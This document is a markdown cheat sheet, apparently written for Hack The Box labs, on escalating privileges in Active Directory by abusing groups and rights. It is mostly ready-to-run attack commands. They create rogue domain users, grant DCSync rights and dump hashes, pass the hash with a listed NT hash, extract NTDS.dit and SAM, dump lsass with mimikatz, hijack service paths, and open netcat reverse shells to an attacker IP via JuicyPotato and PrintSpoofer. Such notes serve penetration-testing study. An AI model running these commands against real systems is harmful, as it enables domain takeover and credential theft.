# Extrating data
```
.\SharpHound.exe --collectionmethods all
bloodhound-python -d intelligence.htb -u Ted.Graves -p 'Mr.Teddy' -ns 10.129.95.154 -c All --zip
```
# Groups
## Account Operators
The Account Operators group has privileges to create and manage domain user accounts, including adding users to certain domain groups (excluding highly privileged groups such as Domain Admins).
Create user:
```
net user shaiiko shaiiko123! /add /domain
```
Add to group:
```
net group "Exchange Windows Permissions" shaiiko /add /domain
# or
Add-DomainGroupMember -Identity "NombreDelGrupo" -Members shaiiko -Credential $Cred
```
Veriying:
```
whoami /groups
net user shaiiko /domain
```

## Exchange Windows Permissions
### WriteDacl
The Exchange Windows Permissions group has WriteDACL rights over the domain object.
This allows its members to modify Access Control Lists (ACLs) on the domain, including granting DCSync privileges to arbitrary users.
```
$SecPassword = ConvertTo-SecureString 'shaiiko123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\shaiiko', $SecPassword)
iwr http://10.10.14.177/PowerView.ps1 -OutFile PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity shaiiko -Rights DCSync
```
Dumping Domain Hashes (DCSync)
```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py htb.local/shaiiko@10.129.8.25
```

PassTheHash:
```
evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
```
## Backup Operators
Enabling and importing
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
Copying a Protected File
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
Explotation
Backup the C: in E:
```
diskshadow.exe
```
Copy files
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
Extracting credentials
```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
OR
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

## Event Log Readers
```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Server Operators
Read the privileges of the service
```
sc qc AppReadiness
c:\Tools\PsService.exe security AppReadiness
```
Change the path
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

# Roles
## GenericAll
Creating a Fake SPN
```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
## ReadGMSAPassword
Getting the Hash of all users that I have control
```
python3 gMSADumper.py python3 gMSADumper.py -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -l 10.129.95.154
```
## AllowedToDelegate
Getting TGT like another user
```
python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :0d5463c6e805b0908b61e90cf9219dc3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```
Configuration
```
export KRB5CCNAME=$(pwd)/Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass dc.intelligence.htb
```
## SeImpersonatePrivilege
````
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
OR
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
````
## SeDebugPrivilege
Extract the file lsass.dmp
````
procdump.exe -accepteula -ma lsass.exe lsass.dmp
````
Read the file
````
mimikatz.exe -c "log" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
````
Another way with [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
In <system_pid>, get a system process with tasklist
````
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,"c:\Windows\System32\cmd.exe","")
````

## SeTakeOwnershipPrivilege
Enabling disable privileges ([Enable-Privilege.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1))
````
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
````

Granted prvileges of a file
````
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
````
In sometimes, it's necesary to change file ACL
````
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
````
